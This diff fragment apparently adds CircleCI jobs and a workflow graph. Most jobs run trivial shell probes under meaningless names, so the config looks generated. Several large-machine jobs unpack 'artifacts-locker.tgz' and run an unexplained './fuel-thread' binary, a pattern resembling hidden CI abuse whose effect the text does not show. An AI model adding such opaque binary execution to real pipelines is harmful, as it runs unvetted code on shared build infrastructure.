+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/iron-gadget-hollow-archive 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  testCPU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: following up with data team
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; for k in $(seq 1 10); do echo $((RANDOM % 60)); done|head -n 3; true ; } > /tmp/cx/receiptThunderLynxIron
+            stat -c '%U:%G' /tmp/cx/receiptThunderLynxIron | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'receiptThunderLynxIron'
+  q3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/receiptThunderLynxIron 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  ix_blend_iterate_brush:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Shift the task graph from staging to cache
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; shuf -i 1-654 -n 11 | sort -n | uniq -c; true ; } > /tmp/cx/8bdff2
+            stat -c '%U:%G' /tmp/cx/8bdff2 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '8bdff2'
+  tweak-retry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/8bdff2 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  pSignalOffsetTuple:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: DO NOT skip the key ring
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; yes "one, two, three" | head -n4; true ; } > /tmp/cx/WOX
+            stat -c '%U:%G' /tmp/cx/WOX | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'WOX'
+  DEV_BUILD_9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/WOX 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  DST_ARTICLE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Plate the mezzanine
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; cat /proc/cpuinfo | \grep -os 'cpu MHz' | sort | uniq -c; true ; } > /tmp/cx/138.125
+            stat -c '%U:%G' /tmp/cx/138.125 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '138.125'
+  v3-nightly2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/138.125 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+  H1D4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Pit stop teardown
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; echo "keep going" >/tmp/outboxreceipt.csv && du -h /tmp/outboxreceipt.csv; true ; } > /tmp/cx/tmp-bkp-bin
+            stat -c '%U:%G' /tmp/cx/tmp-bkp-bin | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'tmp-bkp-bin'
+  update-metrics:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Stage recovery
+          command: |
+            awk '{for(i=1;i<=NF;i++) if(length($i)>2) big[$i]++} END{for(k in big) print big[k],k}' /tmp/cx/tmp-bkp-bin 2>/dev/null | sort -rn | head -3 || true
+      - run:
+          name: Clone target
+          command: git clone --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: tar -xzvf artifacts-locker.tgz
+      - run:
+          command: /bin/sh -c "./fuel-thread"
+
+  app--lg-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: We might fade raw footage
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'ready' | wc -c; true ; } > /tmp/cx/241.115.16
+            stat -c '%U:%G' /tmp/cx/241.115.16 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '241.115.16'
+  appqdk26xss:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: ls lib
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; if [[ ! -e /proc/self ]];then echo Y; fi; true ; } > /tmp/cx/bear523
+            stat -c '%U:%G' /tmp/cx/bear523 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'bear523'
+  NextScopeClockBody:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Be sure to export the model card
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; /bin/echo 'CamelCaseName'; true ; } > /tmp/cx/patch-8340
+            stat -c '%U:%G' /tmp/cx/patch-8340 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'patch-8340'
+  profile_sys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: On success resolve the NTP sync
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; echo -n 'hi there' | fold -w 4; true ; } > /tmp/cx/tmp-bkp-bin
+            stat -c '%U:%G' /tmp/cx/tmp-bkp-bin | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'tmp-bkp-bin'
+  span-90:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: playground
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; grep -n bash /etc/shells | sort -u; true ; } > /tmp/cx/error.log
+            stat -c '%U:%G' /tmp/cx/error.log | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'error.log'
+  m93jf3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Copy that decrypt the webhook secrets
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; df -h -x tmpfs|awk 'NR>1 {print $5, $6}'|tac|wc -l; true ; } > /tmp/cx/jbulj16x6bd
+            stat -c '%U:%G' /tmp/cx/jbulj16x6bd | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'jbulj16x6bd'
+  volcano1218:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Yeet bucket policies
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; if [ -x /usr/bin/awk ]; then echo yes; elif [ -e /tmp ]; then echo maybe; else echo "no"; fi; true ; } > /tmp/cx/9ham6z0y8w4ww
+            stat -c '%U:%G' /tmp/cx/9ham6z0y8w4ww | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '9ham6z0y8w4ww'
+  transColor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Reduce the parcels
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; grep -Rsc export /etc/default 2> /dev/null | sort | head -n 12; true ; } > /tmp/cx/receiptThunderLynxIron
+            stat -c '%U:%G' /tmp/cx/receiptThunderLynxIron | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'receiptThunderLynxIron'
+  SERVER_PORT_MANIFEST:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Wheels up fingerprint
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -tg /usr/local | sort -rk5 | head -n 3; true ; } > /tmp/cx/138.125
+            stat -c '%U:%G' /tmp/cx/138.125 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '138.125'
+  NEW_X:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: fixes
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; echo -n 'spring summer autumn winter'; echo; true ; } > /tmp/cx/0buj5B3gYbrwBA2MtA9a
+            stat -c '%U:%G' /tmp/cx/0buj5B3gYbrwBA2MtA9a | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '0buj5B3gYbrwBA2MtA9a'
+  Mmmm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Turn 22 transcode bumper b
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; if test -k /tmp; then echo yes; else echo no; fi; true ; } > /tmp/cx/28.16.175.246
+            stat -c '%U:%G' /tmp/cx/28.16.175.246 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - '28.16.175.246'
+  Close-IteratorName:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Curse the adapter weights
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; /bin/ls --si /dev/*random| tail -n 3; true ; } > /tmp/cx/WOX
+            stat -c '%U:%G' /tmp/cx/WOX | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'WOX'
+  kilo-echo-1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: loop in qa lead second gen
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; grep ENCRYPT_METHOD /etc/login.defs | nl; true ; } > /tmp/cx/AtolLchuNk
+            stat -c '%U:%G' /tmp/cx/AtolLchuNk | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'AtolLchuNk'
+  northbackup57:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/cx
+      - run:
+          name: Let us stress test the junit output
+          command: |
+            mkdir -p /tmp/cx
+            { set +o pipefail 2>/dev/null; echo -n 'let'\''s go!' | sha1sum; true ; } > /tmp/cx/thicket242
+            stat -c '%U:%G' /tmp/cx/thicket242 | awk '{print "ownr:",$1}'
+      - persist_to_workspace:
+          root: /tmp/cx
+          paths:
+            - 'thicket242'
+workflows:
+  main:
+    jobs:
+      - entry1
+      - app--lg-5:
+          requires:
+            - entry1
+      - go1-21-cov:
+          requires:
+            - app--lg-5
+      - cog-bear-profile:
+          requires:
+            - app--lg-5
+      - appqdk26xss:
+          requires:
+            - cog-bear-profile
+      - node18-cov:
+          requires:
+            - appqdk26xss
+      - Restore-UIWrapper:
+          requires:
+            - appqdk26xss
+      - NextScopeClockBody:
+          requires:
+            - Restore-UIWrapper
+      - verify-quick-docker-image:
+          requires:
+            - NextScopeClockBody
+      - H1D4:
+          requires:
+            - NextScopeClockBody
+      - profile_sys:
+          requires:
+            - H1D4
+      - update-metrics:
+          requires:
+            - profile_sys
+      - AllTheStates:
+          requires:
+            - profile_sys
+      - span-90:
+          requires:
+            - AllTheStates
+      - Package_Release2:
+          requires:
+            - span-90
+      - cherry-cube-sync-static:
+          requires:
+            - span-90
+      - m93jf3:
+          requires:
+            - cherry-cube-sync-static
+      - rl-new:
+          requires:
+            - m93jf3
+      - xcvbnmasdf:
+          requires:
+            - m93jf3
+      - volcano1218:
+          requires:
+            - xcvbnmasdf
+      - QA_CHECK_5:
+          requires:
+            - volcano1218
+      - testCPU:
+          requires:
+            - volcano1218
+      - transColor:
+          requires:
+            - testCPU
+      - q3-rev:
+          requires:
+            - transColor
+      - DST_ARTICLE:
+          requires:
+            - transColor
+      - SERVER_PORT_MANIFEST:
+          requires:
+            - DST_ARTICLE
+      - v3-nightly2:
+          requires:
+            - SERVER_PORT_MANIFEST
+      - SPLIT-promise:
+          requires:
+            - SERVER_PORT_MANIFEST
+      - NEW_X:
+          requires:
+            - SPLIT-promise
+      - mar13-smoke:
+          requires:
+            - NEW_X
+      - exp0r7:
+          requires:
+            - NEW_X
+      - Mmmm:
+          requires:
+            - exp0r7
+      - node20-vet:
+          requires:
+            - Mmmm
+      - pSignalOffsetTuple:
+          requires:
+            - Mmmm
+      - Close-IteratorName:
+          requires:
+            - pSignalOffsetTuple
+      - DEV_BUILD_9:
+          requires:
+            - Close-IteratorName
+      - c11030d164c:
+          requires:
+            - Close-IteratorName
+      - kilo-echo-1:
+          requires:
+            - c11030d164c
+      - jan17-cleanup:
+          requires:
+            - kilo-echo-1
+      - matchAccountShipment:
+          requires:
+            - kilo-echo-1
+      - northbackup57:
+          requires:
+            - matchAccountShipment
+      - wip-router:
+          requires:
+            - northbackup57
+      - rd_us
+      - do-the-thing:
+          requires:
+            - rd_us
+      - vector-PASSWORD:
+          requires:
+            - rd_us
+      - v7-canary4:
+          requires:
+            - vector-PASSWORD
+      - postSidebarById:
+          requires:
+            - vector-PASSWORD
+      - india:
+          requires:
+            - postSidebarById
+      - LIGHT_TAB:
+          requires:
+            - postSidebarById
+      - go1-21-ship:
+          requires:
+            - LIGHT_TAB
+      - email_rates:
+          requires:
+            - LIGHT_TAB
+      - canary-v5:
+          requires:
+            - email_rates
+      - sprint_23062002:
+          requires:
+            - email_rates
+      - produce-quick-release-candidate:
+          requires:
+            - sprint_23062002
+      - StrongUnboundedLockQuery:
+          requires:
+            - sprint_23062002
+      - RunRelease:
+          requires:
+            - StrongUnboundedLockQuery
+      - ix_blend_iterate_brush:
+          requires:
+            - StrongUnboundedLockQuery
+      - tweak-retry:
+          requires:
+            - ix_blend_iterate_brush
+      - SERVER_200007:
+          requires:
+            - ix_blend_iterate_brush
+      - DeployRelease:
+          requires:
+            - SERVER_200007
+      - rmrmrmrm:
+          requires:
+            - SERVER_200007
+      - bob-smoke:
+          requires:
+            - rmrmrmrm
+      - horseSys:
+          requires:
+            - rmrmrmrm
+      - chen-verify:
+          requires:
+            - horseSys
+      - Join-IdItem:
+          requires:
+            - horseSys
+      - november:
+          requires:
+            - Join-IdItem
+      - TNM-31089
+      - sierra-9:
+          requires:
+            - TNM-31089
+      - bi_user:
+          requires:
+            - TNM-31089
+      - promote:
+          requires:
+            - bi_user
+      - qty--chld:
+          requires:
+            - bi_user
+      - perseus:
+          requires:
+            - qty--chld
+      - mission-november:
+          requires:
+            - qty--chld
+      - assemble-nightly-test-matrix:
+          requires:
+            - mission-november
